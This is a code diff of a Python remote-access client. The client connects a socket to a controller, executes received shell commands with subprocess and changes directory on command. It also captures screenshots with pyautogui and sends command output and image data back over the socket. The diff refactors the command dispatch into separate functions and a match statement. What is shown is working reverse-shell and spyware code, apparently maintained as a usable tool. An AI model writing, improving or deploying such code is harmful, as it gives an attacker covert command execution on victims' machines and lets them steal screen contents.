@@ -10,7 +10,18 @@ sock.connect(addr)
 CRTD = "<CRTD>"
 FILE = "<FILE>"
 
-def screenshot():
+def changes_dir(x):  #changes working dir
+    os.chdir(x)
+    sock.send(CRTD.encode())
+
+def execute_cmd(x):  #executes commands on shell
+    output = subprocess.getoutput(x)
+    if output == "":
+        sock.send(CRTD.encode())
+    else:
+        sock.send(output.encode())
+       
+def screenshot():   #function to capture screenshot
     scrn = pyautogui.screenshot()
     name = f"{random.randint(1,1000)}.jpeg"
     scrn.save(name)
@@ -22,17 +33,14 @@ def screenshot():
     sock.send(name.encode())
     sock.send(data)
 
-def command(x):
-    cmd = x.split()
-    if cmd[0] == "cd":
-        os.chdir(cmd[1])
-        sock.send(CRTD.encode())
-    else:
-        output = subprocess.getoutput(cmd)
-        if output == "":
-            sock.send(CRTD.encode())
-        else:
-            sock.send(output.encode())
+def command(cmd):   #validation and logic on recieved commmand 
+    a = cmd.split()
+
+    match a[0]:
+        case "cd":
+            changes_dir(a[1])
+        case _:
+            execute_cmd(a)
 
 while True:
     response = sock.recv(1024).decode()
